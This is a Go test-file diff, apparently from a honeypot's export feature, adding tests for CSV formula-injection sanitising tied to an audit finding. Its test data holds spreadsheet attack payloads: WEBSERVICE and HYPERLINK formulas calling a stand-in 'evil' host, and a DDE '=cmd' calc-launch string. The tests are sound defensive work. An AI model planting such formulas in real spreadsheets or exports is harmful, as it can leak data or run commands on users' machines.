@@ -234,3 +234,52 @@ func TestExportTableWindowParams(t *testing.T) {
 		t.Errorf("合法 from/to 状态码 = %d, 期望 200", rec.Code)
 	}
 }
+
+// TestSanitizeCSVCell 公式注入防护（安全审计 H-1）：= + - @ \t \r 开头的攻击者可控
+// 文本（蜜罐凭据/SSH username）前置单引号，其余原样；空串原样。
+func TestSanitizeCSVCell(t *testing.T) {
+	cases := []struct{ in, want string }{
+		{"=WEBSERVICE(\"http://evil\")", "'=WEBSERVICE(\"http://evil\")"},
+		{"+1+1", "'+1+1"},
+		{"-1", "'-1"},
+		{"@sum(1)", "'@sum(1)"},
+		{"\tcmd", "'\tcmd"},
+		{"\r\nx", "'\r\nx"},
+		{"normal", "normal"},
+		{"", ""},
+		{"明文密码", "明文密码"},
+	}
+	for _, c := range cases {
+		if got := sanitizeCSVCell(c.in); got != c.want {
+			t.Errorf("sanitizeCSVCell(%q) = %q, 期望 %q", c.in, got, c.want)
+		}
+	}
+}
+
+// TestExportTableFormulaInjection 端到端：hp 导出中 = 开头的凭据必须带前导单引号
+// （Excel 按文本展示，不再按公式求值）。
+func TestExportTableFormulaInjection(t *testing.T) {
+	srv, dbPath := newTestServer(t)
+	// 种子经独立可写连接（srv.db 为 mode=ro 只读连接，写入会报 readonly）。
+	wdb, err := sql.Open("sqlite", "file:"+dbPath)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer wdb.Close()
+	if _, err := wdb.Exec(`INSERT INTO cred_events (ts, proto, src_ip, username, password, extra)
+		VALUES (?, 'telnet', ?, ?, ?, 'plaintext')`,
+		time.Now().Unix()-60, 0xCB007105, "=HYPERLINK(\"http://evil\")", "=cmd|'/C calc'!A0"); err != nil {
+		t.Fatal(err)
+	}
+	rec := doExport(t, srv, "/api/v1/export/table?type=hp&from="+fmt.Sprint(time.Now().Unix()-120)+"&to="+fmt.Sprint(time.Now().Unix()+60))
+	if rec.Code != http.StatusOK {
+		t.Fatalf("状态码 = %d, 期望 200", rec.Code)
+	}
+	body := rec.Body.String()
+	if strings.Contains(body, "\n=HYPERLINK") || strings.Contains(body, ",=cmd") {
+		t.Error("公式前缀未转义：CSV 中存在可直接求值的攻击者可控单元格")
+	}
+	if !strings.Contains(body, "'=HYPERLINK") || !strings.Contains(body, "'=cmd") {
+		t.Error("期望公式单元格带前导单引号（文本化）")
+	}
+}
